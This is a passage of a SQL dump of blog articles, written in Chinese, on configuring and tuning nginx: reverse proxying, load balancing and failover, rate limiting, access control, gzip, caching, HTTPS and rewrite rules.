websocket的反向代理\n```json\nlocation /wsApi/ { // 映射前缀\n    proxy_pass http://mywebsocketaddress; // 映射目的地\n    proxy_http_version 1.1;\n    proxy_set_header Upgrade $http_upgrade;\n    proxy_set_header Connection \"upgrade\";\n}\n```\n\n### 动静分离\n```java\n// 什么是动静分离\n1. 传统网站架构模式: jsp,html,image,css,js全部放在一个服务器,把静态动态资源放在同一个服务器上\n2. 动静分离: 静态资源一个服务器,动态资源一个服务器 \n\n```\n#### 静态访问\n![Nginx静态访问.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626678574_Nginx-静态访问.png)\n```java\n静态即是root引导,将请求引导到某一个文件\n```\n#### 动静分离\n![Nginx动静分离.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626678574_Nginx-动静分离.png)\n```java\n1. static.twenq.com	静态(引导至本地静态文件)\n2. www.twenq.com	动态(引导至具体应用服务器)\n3. 静态资源服务器: 使用Nginx实现静态服务器\n4. 动态资源服务器: 使用tomcat实现动态服务器\n\n```', 0, 0, 77, 0, 0, '2019-03-09 14:27:50', '2019-05-24 14:27:50', 0, 0);
INSERT INTO `article` VALUES (19, 1, 'nginx的负载均衡', '2019/1/1547022576_19132347_p0.jpg', '### 基本使用\n![Nginx负载均衡.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626679459_Nginx-负载均衡.png)\n```java\n// 负载均衡是什么\n(1) 负载均衡,英文名称为Load Balance,其意思就是分摊到多个操作单元上进行执行,例如Web服务器、FTP服务器、企业关键应用服务器和其它关键任务服务器等，从而共同完成工作任务。\n(2) 负载均衡就是将所有请求先到负载均衡器,在由负载均衡器采用负载均衡算法(轮训、IP绑定、权重)分发到不同实际的服务器中,这也就是服务器集群,集群的目的是为了减轻单台服务器压力\n\nhttp {\n	upstream bgserver {\n		server 47.168.126.152:3000;\n		server 47.168.126.153:3000;\n	}\n	server {\n		listen 80;\n		server_name poi.com;\n		location / {\n			proxy_pass https://bgserver/\n		}\n	}\n}\n``` \n### 负载均衡算法与故障转移及应用服务器容灾\n```java\n// 什么是应用服务器容灾\n(1) nginx当反向代理转发到上游服务器(真实应用服务器),如果真实应用服务器出现*宕机,延迟*情况下,对方死亡,将尝试反向代理到备用的应用服务器\n(2) 备机不参与负载均衡,而是为了容灾准备\n\n// 什么是故障转移\n1. nginx当反向代理转发到上游服务器(真实应用服务器),如果真实应用服务器出现*宕机,延迟*情况下,直接轮询下一个节点\n2. 故障转移的前提是应用服务器容灾的备机也死亡\n\n// 常见的负载均衡算法\n1. 轮询机制: 轮流访问,非常均匀.应用场景: 服务器配置相同\n2. 权重机制: 使用weight,配置比例等分.权重越高访问次数越高.应用场景: 服务器配置不相同\n3. fail机制: 根据页面大小和加载时间长短与后端服务器响应速度来分配请求,响应时间短的优先分配\n4. IpHash: 通过nginx获取的ip通过hash运算固定分配到某个服务器上,可以解决session共享问题\n5. urlHash: 通过请求url使用hash运算固定分配到某个服务器上,可以解决session共享问题\n\n// Nginx修改负载均衡算法与故障转移\n// 使用默认轮询\nupstream backServer {\n	server 47.56.158.100:3000;\n	server 47.56.158.100:3000;\n} \n// 使用权重\nupstream backServer {\n	server 47.56.158.100:3000 weight=1;	\n	server 47.56.158.100:3000 weight=2; // 权重越高访问率越大\n} \n// 使用ipHash\nupstream backServer {\n	server 47.56.158.53:3000;\n	server 48.59.456.63:3000 backup;\n	ip_hash;\n}\n// 应用服务器容灾\nupstream backServer {\n	server 47.56.158.53:3000;\n	server 48.59.456.63:3000 backup; // 备机,不参与负载均衡\n}\n\n// nginx与上游服务器(真实应用服务器)超时时间 后端服务器连接的超时时间_发起握手等候响应超时时间\nproxy_connect_timeout 1s;\n// nginx发送给上游服务器(真实应用服务器)超时时间\nproxy_send_timeout 1s;\n// nginx接收上游服务器(真实应用服务器)超时时间\nproxy_read_timeout 1s;\n```', 0, 0, 96, 0, 0, '2019-03-10 16:29:45', '2019-03-10 16:29:45', 0, 0);
INSERT INTO `article` VALUES (20, 1, 'nginx常用模块及配置', '2019/6/1560774008_628483C7990EF172E4CB678A1E8C8474.jpg', '### nginxy优势\n```java\n1. IO多路复用epoll\n2. 轻量级,功能模块少,代码模块化\n3. CPU亲和,把CPU核心和Nginx工作进程绑定方式,把每个worker进程固定在一个CPU上执行,减少切换cpu的cachemiss,获取更好的性能\n4. 采用sendfile,基于Linux零拷贝传输模式\n\n```\n### 常见模块\n#### 连接频率限制,limit_conn_module\n```c++\n// key可以是Ip或其他,会话限制针对于某ip\nSyntax: limit_conn_zone #{key} zone=#{name}:#{size}\nDefault: -\nContext: http\n\nSyntax: limit_conn #{name} #{number}	限制并发的数量\nDefault: -\nContext: http,server,location \n```\n```c++\n// http请求建立在一次tcp连接基础上,一次tcp请求至少产生一次。\n// http请求配置限制存储记录的大小与key\nhttp {\n	// 限制某ip的连接次数\n    limit_conn_zone $binary_remote_addr zone=conn_zone:1m;\n    server {\n    	location / {\n			root /opt/app/code;\n			// 某ip单次只允许一个连接\n			limit_conn conn_zone 1;\n			index  index.html index.htm;\n		} \n    }\n}\n```\n\n#### 请求频率限制,limit_req_module\n```c++\n// 配置限制存储记录的大小,key与速率\nSyntax: limit_req_zone #{key} zone=#{name}:#{size} rate=rate\nDefault: -\nContext: http\n\n// 制并发的数量\nSyntax: limit_req zone=#{name} burst=#{number} nodelay\nDefault: -\nContext: http,server,location\n```\n```c++\nhttp {\n	// 限制某ip的请求速率与限制存储记录的大小\n	limit_req_zone $binary_remote_addr zone=req_zone:1m rate=1r/s;\n	server {\n		location / {\n			root /opt/app/code;\n			// 达到请求频率时对3个请求进行延迟3秒响应,其他请求进行503\n			limit_req zone=req_zone burst=3 nodelay;\n			limit_req zone=req_zone burst=3;\n			limit_req zone=req_zone;\n			index  index.html index.htm;	\n		}\n	}	\n}\n```\n\n#### 基于ip的访问控制,http_access_module \n```c++\n// 配置允许访问的ip控制\nSyntax: allow #{address} | CIDR | unix | all;\nDefault: -	\nContext: http,server,location,limit_except\n\n// 配置不允许访问的ip控制\nSyntax: deny #{address} | CIDR | UNIX | all\nDefault: -\nContext: http,server,location,limit_except\n```\n```c++\nserver {\n	// 除了222.128.189.17,其他所有ip都允许访问\n	location ~ ^/admin.html {\n		 root   /opt/app/code;\n		 // 禁止该ip访问\n		 deny 222.128.189.17;\n		 // 允许所有ip访问\n		 allow all;\n		 index  index.html index.htm;\n	}\n	// 只允许222.128.189.0-24访问\n	location ~ ^/admin.html {\n		root   /opt/app/code;\n		// 只允许该ip访问,0-24网段\n		allow 222.128.189.0/24;	\n		// 禁止所有ip访问\n		deny all;\n		index  index.html index.htm;\n	}\n}\n```\n\n#### 随机选择一个页面,http_random_index_module\n```c++\n// 配置是否开启随机主页\nSyntax: random_index on | off\nDefault: random_index off\nContext: location\n```\n```c++\nserver {\n	location / {\n		root   /opt/app/code;\n		// 开启随机主页\n		random_index on;\n	}\n}\n```\n#### 安全链接,secure_link_module\n```c++\n// 安全链接模块\n// 制定并允许检查请求的链接的真实性以及保护资源免受未经授权的访问,基于加签方法的验证\n// 限制链接生效周期\n// 生成验证链接如 /download?md5=1YHN123jasdlUINAD&expires=1539792000\nsecure_link_module\n	Syntax: secure_link expression\n	Default: -\n	Context: http,server,location\n	\n	Syntax: secure_link_mod5 expression\n	Default: -\n	Context: http,server,location\n```\n```c++\n// nginx.conf\nserver {\n	listen       80;\n	server_name  localhost;\n	root /opt/app/code;\n	location / {\n		secure_link $arg_md5,$arg_expires;\n		// 设置口令\n		secure_link_md5 \"$secure_link_expires$uri myMD5Salt\";\n		if ($secure_link = \"\") {\n			return 403;\n		}\n		if ($secure_link = \"0\") {\n			return 410;\n		}\n	}\n}\n\n// 生成链接示例\n#!/bin/sh\n#\nservername=\"jeson.t.test.io\"\ndownload_file=\"/download/file.img\"\ntime_num=$(date -d \"2018-10-18 00:00:00\" +%s)\nsecret_num=\"myMD5Salt\"\n\nres=$(echo -n \"${time_num}${download_file} ${secret_num}\"|openssl md5 -binary | openssl base64 | tr +/ -_ | tr -d =)\n\necho \"http://${servername}${download_file}?md5=${res}&expires=${time_num}\"\n```\n#### 区别国内外作访问控制,geoip_module\n```c++\n// 基于ip地址匹配MaxMindGeoIP二进制文件,读取ip所在地域信息\n// 需要借助第三方模块国家地区ip数据字典\n// yum install nginx-module-geoip\ngeoip_module\n	// 国家名称\n	$geoip_country_name\n	// 国家代码\n	$geoip_country_code\n	// 国家城市\n	$geoip_city\n```\n```c++\n// 导入geoip相关数据依赖\ngeoip_country /etc/nginx/geoip/GeoIP.dat;\ngeoip_city /etc/nginx/geoip/GeoLiteCity.dat;\nserver {\n	location / {\n		if ($geoip_country_code != CN) {\n			return 403;\n		}\n		root   /usr/share/nginx/html;\n		index  index.html index.htm;\n	}\n	\n	location /myip {\n		default_type text/plain;\n		return 200 \"$remote_addr $geoip_country_name $geoip_country_code $geoip_city\";\n	}\n}\n```\n\n### 静态读取资源相关配置\n#### 解压缩,提高传输速率\n```c++\n// 文件读取,采用sendfile,基于Linux零拷贝技术提高效率\nsendfile\n	Syntax: sendfile on | off\n	Default: sendfile off\n	Context: http,server,location,if in location\n\n// sendfile开启的情况下,将传输包进行合并,实时性要求低,提高网络包的传输速率\ntcp_nopush \n	Synctax: tcp_nopush on | off\n	Default: tcp_nopush off\n	Context: http,server,location\n\n// 将传输包立刻发出,实时性要求高,在keepalive长连接下,提高网络包的传输实时性\ntcp_nodelay	\n	Syntax: tcp_nodelay on | off\n	Default: tcp_nodelay on\n	Context: http,server,location\n\n// 压缩传输,尽可能的压缩包,提高效率\ngzip\n	Syntax: gzip on | off\n	Default: gzip off\n	Context: http,server,location,if in location\n\n// 压缩等级,等级越高,压缩比例越高,传输的文件越小\ngzip_comp_level \n	Syntax: gzip_comp_level #{level}\n	Default: gzip_comp_level 1\n	Context: http,server,location\n\n// gzip协议版本y\ngzip_http_version 1.0|1.1 \n	Syntax: gzip_http_version 1.0|1.1\n	Default: gzip_http_version 1.1\n	Context: http,server,location\n\n// 预读功能,首先去找对应的gz压缩文件,存在立刻返回\ngzip_static_module\n	Syntax: gzip_static on | off\n	Default: gzip_static off\n	Context: location\n```\n```c++\nserver {\n	sendfile on;\n	location ~ .*\\.(jpg|gif|png)$ {\n		gzip on;\n		gzip_http_version 1.1;\n		gzip_comp_level 2;\n		gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/\n		javascript application/x-httpd-php image/jpeg image/gif image/png;\n		root  /opt/app/code/images;\n	}\n	\n	location ~ .*\\.(txt|xml)$ {\n		gzip on;\n		gzip_http_version 1.1;\n		gzip_comp_level 1;\n		gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/\n		javascript application/x-httpd-php image/jpeg image/gif image/png;\n		root  /opt/app/code/doc;\n	}\n	\n	location ~ ^/download {\n		gzip_static on;\n		tcp_nopush on;\n		root /opt/app/code;\n	}\n}\n```\n#### 设置Cache-Control,Expires缓存过期时间以及响应头\n```c++\n// 添加Cache-Control,Expires头\n// 缓存与http的expires,etag,last-modified有关\nexpires\n	Syntax: expires #{time};\n	Default: expires off;\n	Context: http,server,location,if in location\n\n// 添加响应头\nadd_header \n	Syntax: add_header name value\n	Default: -\n	Context: http,server,location,if in location\n```\n```c++\nserver {\n	location ~ .*\\.(htm|html)$ {\n		root  /opt/app/code;\n		add_header Access-Control-Allow-Origin *;\n		add_header Access-Control-Allow-Methods GET,POST,PUT,DELETE,OPTIONS;\n		// 缓存24小时\n		expires 24h;\n	}\n}\n```\n#### refer防盗链\n```c++\n// 访问来源配置模块\nhttp_refer \n	Synctax: valid_referers none | blocked | server_names | string...\n	Default: -\n	Context: server,location\n```\n```c++\nserver {\n	location ~ .*\\.(jpg|gif|png)$ {\n		gzip on;\n		gzip_http_version 1.1;\n		gzip_comp_level 2;\n		gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/\n		javascript application/x-httpd-php image/jpeg image/gif image/png;\n		\n		// 允许116.62.103.228和google网站进行访问\n		valid_referers none blocked 116.62.103.228 ~/google\\./;\n		if ($invalid_referer) {\n			return 403;\n		}\n		root  /opt/app/code/images;\n	}\n}\n```\n### 代理相关配置\n```c++\n// 代理地址\nproxy_pass\n	Syntax: proxy_pass url;		\n	Default: -\n	Context: location,if in location,limit_except\n\n// 缓冲区\nproxy_buffering\n	Syntax: proxy_buffering on | off\n	Default: proxy_buffering on\n	Context: http,server,location\n\n// 跳转重定向\nproxy_redirect\n	Syntax: proxy_redirect default;proxy_redirect off;proxy_redirect redirect replacement;\n	Default: -\n	Context: http,server,location\n\n// 头信息\nproxy_set_header\n	Syntax: proxy_set_header field value\n	Default: proxy_set_header Host $proxy_host;proxy_set_header Connection close;\n	Context: http,server,location\n\n// nginx代理到服务端的超时时间\nproxy_connect_timeout\n	Syntax: proxy_connect_timeout time;\n	Default: proxy_connect_timeout 60s;\n	Context: server,location\n```\n```c++\nserver {\n	location / {\n		// 正向代理\n		proxy_pass http://$http_host$request_uri;\n	}\n\n	location / {\n		// 相比$remote addr,该值可以获取实际代理服务器前的ip\n		// 但该头信息可以被更改,且不是所有代理件都遵循该头\n		// 建议在ip1初始化客户端定义一个请求头进行传递\n		if ( $http_x_forwarded_for !~* \"^116\\.62\\.103\\.228\") {\n			return 403;\n		}\n		root   /opt/app/code;\n		index  index.html index.htm;	\n    }\n	\n	location / {\n		proxy_pass http://127.0.0.1:8080;\n		// 引用文件内容\n		include proxy_params;\n	}\n	\n	location / {\n		// 代理地址\n		proxy_pass http://127.0.0.1:8080;\n		// 重设为重定向\n		proxy_redirect default;\n		// 设置请求头\n		proxy_set_header Host $http_host;\n		proxy_set_header X-Real-IP $remote_addr;\n		// 超时\n		proxy_connect_timeout 30;\n		proxy_send_timeout 60;\n		proxy_read_timeout 60;\n		// 缓冲区\n		proxy_buffer_size 32k;\n		proxy_buffering on;\n		proxy_buffers 4 128k;\n		proxy_busy_buffers_size 256k;\n		proxy_max_temp_file_size 256k;	\n	}\n	\n}\n```\n### 负载均衡相关配置\n```c++\n// 配置负载均衡\nupstream \n	Syntax: upstream name {...}\n	Default: -\n	Context: http\n```\n```c++\n/*\n	后端服务器在负载均衡调度中的状态\n	down		当前的server暂时不参与负载均衡\n	backup		预留的备份服务器\n	max_fails	允许请求失败的次数\n	fail_timeout 经过max_fails失败后,服务暂停的时间\n	max_conns	限制最大的接收的连接数\n*/\nupstream test{\n        server 116.62.103.228:8001 down;\n        server 116.62.103.228:8002 backup;\n        server 116.62.103.228:8003 max_fails=1 fail_timeout=10s;\n}\n\n/*\n	调度算法\n	轮询-按时间顺序逐一分配到不同的后端服务器,默认\n	加权轮询-weight值越大,分配的访问几率越高\n	ip_hash-每个请求按访问的ip的hash结果分配,这样来自同一个ip的固定访问一个后端服务器\n	url_hash-按照访问的url的hash结果来分配请求,这样每个url定向到同一个后端服务器\n	least_conn-最少连接数,哪个机器连接少就分发\n	hash关键值-hash自定义的key\n*/\n// 加权轮询\nupstream test{\n        server 116.62.103.228:8001;\n        server 116.62.103.228:8002 weight=5;\n        server 116.62.103.228:8003;\n}\n// ip_hash\nupstream test{\n        ip_hash;\n        server 116.62.103.228:8001;\n        server 116.62.103.228:8002;\n        server 116.62.103.228:8003;\n}\n// url_hash\nupstream test{\n        hash $request_uri;\n        server 116.62.103.228:8001;\n        server 116.62.103.228:8002;\n        server 116.62.103.228:8003;\n}\n```\n### 缓存相关配置\n```c++\n// 缓存相关配置\nproxy_cache_path \n	Syntax: proxy_cache_path path[levels=levels][use_temp_path=on|off]\n				keys_zone=name:size [inactive=time] [max_size=size] [manager_files=number]\n				[manager_sleep=time] [manager_threshold=time] [loader_files=numbers]\n				[loader_sleep=time] [loader_threshold=time] [purger=on|off]\n				[purger_files=number] [purger_sleep=time] [purger_threshold=time]\n	Default: -\n	Context: http\n\n// 缓存过期周期\nproxy_cache_valid \n	Syntax: proxy_cache_valid [code...]time;\n	Default: -\n	Context: http,server,location\n\n// 缓存纬度,根据什么key\nproxy_cache_key\n	Syntax: proxy_cache_key string;\n	Default: proxy_cache_key $scheme$proxy_host$request_uri\n	Context: http,server\n\n// 不参与缓存的页面\nproxy_no_cache \n	Syntax: proxy_no_cache string\n	Default: -\n	Context: http,server,location\n```\n```c++\nhttp {\n	upstream test{\n        server 116.62.103.228:8001;\n        server 116.62.103.228:8002;\n        server 116.62.103.228:8003;\n    }\n	proxy_cache_path /opt/app/cache levels=1:2 keys_zone=imooc_cache:10m max_size=10g inactive=60m use_temp_path=off;\n	server {\n		// 校验url地址\n		if ($request_uri ~ ^/(url3|login|register|password\\/reset)) {\n        	set $cookie_nocache\n    	}\n		location / {\n			proxy_cache on;\n			proxy_pass http://test;\n			proxy_cache_valid 200 304 12h;\n			proxy_cache_valid any 10m;\n			proxy_cache_key $host$uri$is_args$args;\n			proxy_no_cache $cookie_nocache\n			// 请求头添加nginx缓存状态\n			add_header  Nginx-Cache \"$upstream_cache_status\"; \n			// 失败时自动跳转至一下负载均衡服务器节点\n			proxy_next_upstream error t	imeout invalid_header http_500 http_502 http_503 http_504;\n		}\n	}\n}\n```\n### https相关配置\n```c++\n// https相关配置\nssl\n	Syntax: ssl on | off\n	Default: ssl off\n	Context: http,server\n	\n	Syntax: ssl_certificate file\n	Default: -\n	Context: http,server\n```\n```c++\n#user  nobody;\nworker_processes  1;\n\n#error_log  logs/error.log;\n#error_log  logs/error.log  notice;\n#error_log  logs/error.log  info;\n\n#pid        logs/nginx.pid;\n\n\nevents {\n    worker_connections  1024;\n}\n\n\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n\n    sendfile        on;\n    keepalive_timeout  65;\n\n    server {\n        listen       80;\n        server_name  blog.tuwq.cn;\n\n        location / {\n            root   html;\n            rewrite ^/(.*) https://blog.tuwq.cn/$1 redirect;\n        }\n\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n\n    }\n\n\n    server {\n        listen 443;\n        server_name blog.tuwq.cn;\n        ssl on;\n        root /usr/blog/page/build;\n        index index.html index.htm;\n\n        ssl_certificate   cert/1938525_blog.tuwq.cn.pem;\n        ssl_certificate_key  cert/1938525_blog.tuwq.cn.key;\n        ssl_session_timeout 5m;\n        ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;\n        ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n        ssl_prefer_server_ciphers on;\n\n        underscores_in_headers on;\n        charset utf-8;\n\n        location / {\n          try_files $uri $uri/ @router;\n          proxy_set_header X-Real-IP  $remote_addr;\n              index index.html;\n        }\n        \n        location @router {\n          rewrite ^.*$ /index.html last;\n        }   \n    }\n}\n```\n\n### rewrite语法\n```c++\n// 配置语法\nrewrite\n	// 改写替换\n	Syntax: rewrite regex replacement [flag]\n	Default: -\n	Context: server,location,if\n\n// 应用场景\n1 .URL访问跳转,支持开发设计,页面跳转,兼容性支持,展示效果等\n2. seo优化\n3. 后台维护,流量转发\n4. 安全\n\n// 规则优先级\n1. 执行server块的rewrite指令\n2. 执行location匹配\n3. 执行选定的location中的rewrite\n```\n```c++\n/*\n	break	停止rewrite检测,不会匹配接下来其他的loaction停止rewrite检测,会重新建立请求连接去尝试匹配后面的location\n	last	停止rewrite检测,会重新建立请求连接去尝试匹配后面的location\n	redirect	返回302临时重定向,地址栏会显示跳转后的地址,会访问后端\n	permanent	返回302永久重定向,地址栏会直接到跳转后的地址,不再访问后端		\n*/\nserver {\n    root /opt/app/code; \n    location ~ ^/break {\n        rewrite ^/break /test/ break;\n    } \n \n    location ~ ^/last {\n         rewrite ^/last /test/ last;\n         #rewrite ^/last /test/ redirect;\n    }    \n\n    location ~ ^/test {\n         rewrite ^/test http://www.test.com/ permanent;\n         #rewrite ^/test http://www.test.com/ redirect;\n    }    \n \n    location /test/ {\n       default_type application/json;\n       return 200 \'{\"status\":\"success\"}\';\n    }\n}\n\nserver {\n	location / {\n        rewrite ^/course-(\\d+)-(\\d+)-(\\d+)\\.html$ /course/$1/$2/course_$3.html break;\n        // 是chrome浏览器则重定向跳转\n        if ($http_user_agent ~* Chrome) {\n            rewrite ^/nginx http://coding.test.com/class/121.html redirect;\n        } \n\n        // 请求的文件路径是否存在\n        if (!-f $request_filename) {\n            rewrite ^/(.*)$ http://www.baidu.com/$1 redirect;\n        }\n        index  index.html index.htm;\n    }\n}\n```\n### CPU亲和度配置\n```c++\nuser  nginx;\nworker_processes  16;\n#worker_cpu_affinity 0000000000000010 0000000000000010 0000000000000100 0000000000001000 0000000000010000 0000000000100000 0000000001000000 0000000010000000 0000000100000000 0000001000000000 0000010000000000 0000100000000000 0001000000000000 0010000000000000 0100000000000000 1000000000000000;\n#worker_cpu_affinity 1010101010101010 0101010101010101;\nworker_cpu_affinity auto;\n\nerror_log  /var/log/nginx/error.log warn;\npid        /var/run/nginx.pid;\n\nworker_rlimit_nofile 35535;\n\nevents {\n    use epoll;\n    worker_connections  10240;\n}\n\nhttp {\n    include       /etc/nginx/mime.types;\n    default_type  application/octet-stream;\n    #######\n    #Charset\n    charset utf-8;\n\n    log_format  main  \'$remote_addr - $remote_user [$time_local] \"$request\" \'\n                      \'$status $body_bytes_sent \"$http_referer\" \'\n                      \'\"$http_user_agent\" \"$http_x_forwarded_for\" \"$request_uri\"\';\n\n    access_log  /var/log/nginx/access.log  main;\n    \n    #######\n    #Core modlue\n    sendfile        on;\n    #tcp_nopush     on;\n    #tcp_nodeny     on;\n    keepalive_timeout  65;\n    \n    ########\n    #Gzip module\n    gzip  on;\n    gzip_disable \"MSIE [1-6]\\.\";  \n    gzip_http_version 1.1; \n    \n    ########\n    #Virtal Server\n    include /etc/nginx/conf.d/*.conf;\n}\n```', 0, 0, 53, 0, 0, '2019-03-10 20:05:06', '2019-03-10 20:05:06', 0, 0);
INSERT INTO `article` VALUES (21, 1, 'nginx的调优参数', '2021/5/1621152494_mmexport1621058338170.jpg', '### nginx工作进程数量优化\n```java\n// IO密集型: 调整worker进程数=CPU的核心数 * 2\n// (1) linux查看cpu信息命令: \nlscpu\n// (2) 修改vi nginx.conf\nworker_processes 2;\n// (3) 查看nginx的进程数\nps -ef | grep nginx | grep -v grep\n```\n### nginx运行CPU亲和力优化\n```java\n// 绑定nginx进程到不同的CPU上,充分利用硬件多CPU多核\n// 修改nginx.conf,添加一行\nworker_processes 2; # 配置2个cpu\nworker_cpu_affinity 01 10; # 配置2个cpu\nworker_processes 4; # 配置4个cpu\nworker_cpu_affinity 0001 0010 0100 1000; # 配置4个cpu\n```\n### nginx最大打开文件数优化\n```java\n// nginx报错打开文件数过多,socket: Too many open files\n// 修改nginx.conf\nworker_rlimit_nofile 1028;\nevents {\n	worker_connections 1028;\n}\n\n// 修改 vi /etc/security/limits.conf添加以下内容\n* hard nofile 204800\n* soft nofile 204800\n* soft core unlimited\n* soft stack 204800\n\n// 修改操作系统支持的最大文件打开数\nulimit -n 1028\n\n// 查看修改后操作系统最大文件打开数,查看open files的数量\nulimit -a\n```\n### nginx事务处理模型优化\n```java\n// 常见的事件处理模型\n// select\n(1) select库是在linux和windos平台都支持的事件驱动模型库,并且接口的定义也基本相同,同时部分参数的含义略有差异,最大并发数限制1024,是最早期的事件驱动模型\n\n// poll\n(1) linux的基本驱动模型,windows不支持此驱动模型,是select的升级版,取消了最大的并发限制,在编译nginx的时候,可以使用--with-poll_module和--without-poll_module这两个指定是否编译poll库\n\n// epoll\n(1) epoll库是nginx服务器支持的最高性能的事件驱动库之一,epoll是poll的升级版,但是与poll的效率有很大的差别.\n(2) epoll的处理方式是创建一个待处理的事件列表,然后把这个列表发给内核,返回的时候再去轮询检查这个列表,以判断事件是否发生,epoll支持一个进程打开的最大事件描述符的上限是系统可以打开的文件的最大数,同时epoll库的IO效率不随描述符数目增加而线性下降,因为它只会对内核上报的\"活跃\"的描述符进行操作\n\n// kqueue\n(1) 用于支持BSD系统平台的高效事件驱动模型,主要用在FreeBSD4.1及以上版本,OpenBSD2.0及以上版本,NetBSD及以上版本及MacOSX平台上,该模型也是poll库的变种,因此和epoll没有本质上的区别,都是通过避免无效无事件轮询操作提高效率\n\n// /dev/poll;\n(1) 用于支持unix衍生平台的高效事件驱动模型,主要在Solaris平台、HP\\UX,该模型是sun公司在开发Solaris系列平台的时候提出的用于完成事件驱动机制的方案,它使用了虚拟的/dev/poll设备,开发人员将要监视的文件描述符加入这个设备,然后通过ioctl()调用来获取事件通知,因此运行在以上系列平台的时候请使用/dev/poll事件驱动机制\n\n// eventport\n该方案也是sun公司在开发Solaris的时候提出的事件驱动库,支持Solaris10以上版本,该驱动库能有效防止内核崩溃等情况发生\n\n// 不同操作系统采用不同的I/O模型\n(1) linux下,nginx使用epoll的I/O多路复用模型\n(2) Freebsd下,nginx使用kqueue的I/O多路复用模型\n(3) Solaris下,nginx使用/dev/poll方式的I/O多路复用模型\n(4) Windows下,nginx使用icop的I/O多路复用模型\n\n// 修改 nginx.conf\nevent {\n	use epoll;\n	multi_accept on;\n}\n```\n### nginx高效传输模式\n```java\n // nginx中的零拷贝\nhttp {\n	sendfile on; #减少文件在应用和内核之间拷贝\n	tcp_nopush on; #当数据包达到一定大小再发送\n	tcp_nodelay off; #有数据随时发送\n}\n```\n### nginx超时时间优化\n```java\n// 什么是连接超时\n(1) 举个例子,某饭店请了服务员招待顾客,但是现在饭店不景气,因此要解雇一些服务员,这里的服务员就相当于nginx服务建立的连接\n(2) 当服务器建立的连接没有接收处理请求时,可以在指定时间内让它超时自动退出\n\n// 连接超时作用\n(1) 将无用连接设置为尽快超时,可以保护服务器的系统崩溃(CPU,内存,硬盘)\n(2) 当连接很多时,及时断掉那些建立好的但又长时间不做事的连接,以减少其占用的服务器资源\n(3) 如果黑客攻击,会不断的和服务器建立连接,因此设置连接超时以防止大量消耗服务器的资源\n(4) 如果用户请求了动态服务器,则nginx就会建立连接,请求fastCGI服务器以及后端mysql服务,设置连接超时,使得在用户容忍时间内返回数据\n\n// 连接超时存在的问题\n(1) 服务器建立新连接是要消耗资源的,高并发时,连接超时时间不宜设置太长,导致服务器资源耗尽\n\n// 设置连接超时\nhttp {\n	keepalive_timeout 65; # 该参数用于设置客户端连接保持会话的超时时间,超过这个时间服务器会关闭该连接\n	client_header_timeout 5; # 该参数用于设置读取客户端请求头数据的超时时间,如果超时客户端还没有发送完整的header数据,服务器将返回\"Request time out(408)\"错误\n	client_body_timeout 5; # 该参数用于设置读取客户端请求主体数据的超时时间,如果超时客户端还没有发送完整的主体数据,服务器将返回\"Request time out(408)\"错误\n	send_timeout 25; # 用于指定响应客户端的超时时间,如果超过这个时间,客户端没有任何活动,nginx将会关闭连接\n	tcp_nodelay on; # 默认情况下当数据发送时,内核并不会马上发送,可能会等待更多的字节组成一个数据包,这样可以提高I/O性能,但是,在每次只发送很少字节的业务场景中,使用tcp_nodelay功能,等待时间会比较长\n}\n```\n### nginx-fastcgi优化\n```java\n// 什么是CGI\n// CGI又叫通用官网接口;主要是HTTP服务器和其他机器数据通信的工具,一般webServer接收浏览器的请求后,会判断请求资源属于静态资源(CSS,JS,JPG)还是动态资源(PHP);一般静态资源直接返回给浏览器渲染即可,而PHP文件之类的动态资源就需要CGI进行处理了\n// 什么是FastCGI\n// FastCGI就是为了提高CGI性能而出现的,每当有PHP文件请求CGI,CGI每次都会进行环境的初始化,非常消耗性能,响应速度也非常慢,所以FastCGI出现了,FastCGI会启动一个master进程,master主要负责环境的初始化,这样每当有php文件请求的时候,只需要将请求传递给worker进程就行了\n// 修改nginx.conf\nhttp {\n	fastcgi_connect_timeout 240; # nginx服务器和后端FastCGI服务器连接的时间\n	fastcgi_send_timeout 240; # nginx允许FastCGI服务器返回数据的超时时间,即规定时间内后端服务器必须传完所有的数据,否则nginx将断开这个连接\n	fastcgi_read_timeout 240; # nginx从FastCGI服务器读取响应信息的超时时间,表示连接建立成功后,nginx等待后端服务器的响应时间\n	fastcgi_buffer_size 64k; # nginx FastCGI的缓冲区大小,用来读取从FastCGI服务端收到的第一部分响应信息的缓冲区大小\n	fastcgi_buffers 8 128k; # 设定用来读取从FastCGI服务器端收到的响应信息的缓冲区大小和缓冲区数量;8表示大小,128k表示大小\n	fastcgi_busy_buffers_size 128k; # 用于设置系统很忙时可以使用的proxy_buffers大小\n}\n```\n### nginx-gzip优化\n```java\n// Gzip压缩作用\n将响应报文发送至客户端之前可以启用压缩功能,这能够有效地节约带宽,并提高响应至客户端的速度,Gzip压缩可以配置http,server和location模块\n// Gzip修改配置\ngzip on; # 开启gzip压缩功能\ngzip_min_length 10k; # 设置允许压缩的页面最小字节数;这里表示如果文件小于10个字节,就不用压缩,因为没有意义,本来就很小\ngzip_buffers 4 16k; # 设置压缩缓冲区的大小,此处设置为4个16k内存作为压缩结果流缓存\ngzip_http_version 1.1; # 压缩版本\ngzip_comp_level 2; # 设置压缩比率,最小为1,处理速度快,传输速度慢;9为最大压缩比,处理速度慢,传输速度快;这里表示压缩级别,可以是0-9中的任一个,级别越高,压缩就越小,节省了带宽资源,但同时也消耗CPU资源,所以一般折中为6\ngzip types text/css text/xml application/javascript; # 制定压缩的类型,线上配置时尽可能配置多的压缩类型\ngzip_disable \"MSIE[1-6]\\.\"; # 配置禁用gzip条件,支持正则.此处表示ie6及以下版本不启用gzip(因为ie低版本不支持)\ngzip vary on; # 选择支持vary header; 该选项可以让前端的缓存服务器缓存经过gzip压缩的页面;这个可以不写,表示在传送数据时,跟客户端说明我使用了gzip压缩\n\n// Gzip注意点\nnginx的gzip压缩功能虽然好用,但是下面两类文件资源不太建议启用此压缩功能\n(1) 图片类型资源(包括视频文件)\n(2) 大文件资源\n```\n### nginx-expires优化\n```java\n// 